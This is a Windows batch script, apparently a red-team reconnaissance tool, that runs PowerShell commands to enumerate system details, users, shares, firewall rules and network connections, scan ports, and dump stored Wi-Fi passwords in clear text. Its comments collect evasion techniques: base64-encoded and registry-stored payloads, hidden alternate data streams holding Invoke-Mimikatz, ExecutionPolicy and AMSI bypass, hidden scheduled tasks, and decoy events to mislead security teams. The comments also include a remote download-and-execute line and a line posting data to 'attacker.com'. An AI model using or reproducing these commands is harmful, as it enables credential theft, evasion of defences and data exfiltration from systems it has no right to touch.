@echo off
REM Interesting link related to powershell command :
REM     https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.4

REM Most of the command are from redteamrecipe.com :
REM     https://redteamrecipe.com/powershell-tips-tricks/

REM Related to Service Control Manager (significant aspect of PrivEsc): 
REM     https://pentestlab.blog/2023/03/20/persistence-service-control-manager/
REM     https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md

REM Batch files can be obfuscated so as to prevent antivirus defense and analysis.
REM A beginner guide to this field : https://www.oneconsult.com/en/blogs/news-blog/an-introduction-to-batch-file-obfuscation/

REM An Advanced guide to powershell obfuscation : https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf

REM If you want to get the output of the reconfile.bat in a new file :
REM     ./reconfile.bat > logfile.txt 2>&1
REM Don't forget to encrypt this file to obfuscate AV.
REM If you have any trouble with permission, try to add -ExecutionPolicy Bypass before the -Command.
REM Bypassing AMSI can be useful, go learn it.

REM Polymorphism, metamorphism are deep fields to file obfuscation. 

REM You can encrypt powershell commands :
REM     powershell -Command "$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); Invoke-Expression $decodedString"

REM Create alias in order to obfuscate detection :
REM     powershell -Command "$alias = 'Get-Dir'; Set-Alias -Name $alias -Value Get-ChildItem; Invoke-Expression $alias"

REM Concatenate variable :
REM     powershell -Command "$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd"

REM Base64 path can be interesting too :
REM     powershell -Command "$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz==')); Invoke-Item $path"

REM Base64 command can help bypass command-line logging :
REM     powershell -Command "$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process')); powershell.exe -EncodedCommand $encodedCmd"

REM The use of runspace can help to evade detection too :
REM     powershell -Command "$runspace = [runspacefactory]::CreateRunspace(); $runspace.Open(); $pipeline = $runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $results = $pipeline.Invoke(); $runspace.Close(); $results"

REM In addition, uses of environment variable can assist in evade detection of command execution :
REM     powershell -Command "$env:PSVariable = 'Get-Process'; Invoke-Expression $env:PSVariable"

REM Usage of registry key to store and execute when you want some payload can be helpful :
REM The payload can be encoded in base64.
REM     powershell -Command "$path='HKCU:\Software\MyApp';$valueName='Config';$base64Encoded='R2V0LVByb2Nlc3M=';New-Item -Path $path -Force;New-ItemProperty -Path $path -Name $valueName -Value $base64Encoded -PropertyType String -Force;Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path $path -Name $valueName).$valueName)))"

REM Hide commands or data in alternate data streams of files can be a good option
REM     powershell -Command "$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream"

REM In order to bypass ExecutionPolicy directly in powershell command :
REM Note that you can do it in the batch file by adding -Execution Policy Bypass like said before.
REM     powershell -Command "$policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; # Run your script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process"

REM Execute script only in memory with the aim of evade file-based detection mechanisms instead of simply execute ps1 file (stupid idea). The ps1 file can be in your usb key.
REM     powershell -Command "$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code"

REM In order to create a scheduled task and execute Powershell commands (not yet superbly functional) :
REM     powershell -Command "$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command ''Start-Sleep -Seconds 10; ipconfig > C:\temp\output.txt'''; $trigger = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'MyTask' -Description 'MyDescription'"

REM Add useless code, create function of something that already existed is used to make hard life to forensics.
REM Renaming function that already existe aim at be less suspicious :
REM     powershell -Command "Function MyGetProc { Get-Process }; MyGetProc"

REM You can also load dynamic command/script by using the following command :
REM     powershell -Command "$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)"

REM Exfiltrates data out-of-band : Guide : https://socprime.com/blog/what-is-data-exfiltration-mitre-attack/#Types_of_Data_Exfiltration
REM Note that you need a server that support POST request. Python file is included.
REM     powershell -Command "$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post -Body $data"

REM In order to get system information.
powershell -Command "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "systeminfo"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-ComputerInfo
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-LocalUser"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-LocalGroup"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-SMBShare"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-NetFirewallRule"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "query user"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-WmiObject -Class Win32_UserAccount"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-WmiObject -Class Win32_BIOS"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-WmiObject -Class Win32_Printer"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM Display network information.
powershell -Command "ipconfig /all; arp -a"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-NetTCPConnection"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-DnsClientServerAddress
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-NetUDPEndpoint | Where-Object {$_.OwningProcess -ne 0}"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Currentversion\Internet Settings'"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
powershell -Command "Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM In order to scan port, don't forget to pay attention to logs. 
powershell -Command "1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false); if($sock.Connected) { $_ } ; $sock.Close() }"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM In order to execute ps1 scripts :
REM     powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; .\script.ps1"
REM     echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM In order to extract wifi profiles and associated passwords stored :
powershell -Command "netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM In order to track any changes such as file creation. There is much more with FileSystemWatcher. To be explored.
REM For instance, you can DoS the monitoring system by create a lot of event.
REM You can furthermore create fake event to decoy security team.
powershell -Command "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
REM In order to capture network packets. Require administrator privileges.
REM Don't forget to change Path\to\be\changed and Waiting_time (60 seconds by default).
REM Logs will be in ETL formats, you hence need to be able to open it. I suggest you to use a Windows VM and analyze it in Event Viewer.
REM     powershell -ExecutionPolicy Bypass -Command "Get-EventSubscriber | Unregister-Event -Force"
REM     powershell -ExecutionPolicy Bypass -Command "$adapter = Get-NetAdapter | Select-Object -First 1; if ($adapter) { $sessionName = 'Session1'; $session = New-NetEventSession -Name $sessionName -CaptureMode SaveToFile -LocalFilePath 'Path\to\be\changed'; Add-NetEventPacketCaptureProvider -SessionName $sessionName -Level 4 -CaptureType Both; Start-NetEventSession -Name $sessionName; Start-Sleep -Seconds Waiting_time; Stop-NetEventSession -Name $sessionName } else { Write-Host 'No adapter was found.' }"
REM     echo ~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
pause


